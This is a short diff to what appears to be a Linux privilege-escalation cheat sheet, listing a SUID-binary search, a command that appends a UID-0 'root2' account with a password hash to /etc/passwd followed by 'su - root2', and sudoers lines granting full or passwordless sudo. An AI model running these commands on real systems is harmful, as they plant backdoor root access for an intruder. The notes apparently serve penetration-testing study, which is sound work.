@@ -157,8 +157,12 @@ find / -perm -u=s -type f 2>/dev/null
     # || Encrypt with random salt
     openssl passwd foo
 
-    echo "root2:aaKNIEDOaueR6:0:0:root:/root:/bin/bash" >> /etc/passwd
+    echo "root2:aaKNIEDOaueR6:0:0:root:/root:/bin/sh" >> /etc/passwd
+    su - root2
     ```
+- `/etc/sudoers`
+    - `foo ALL=(ALL) ALL`
+    - `foo ALL=(ALL) NOPASSWD`
 
 - https://en.wikipedia.org/wiki/Crypt_(C)#Key_derivation_functions_supported_by_crypt
 - https://man7.org/linux/man-pages/man3/crypt.3.html
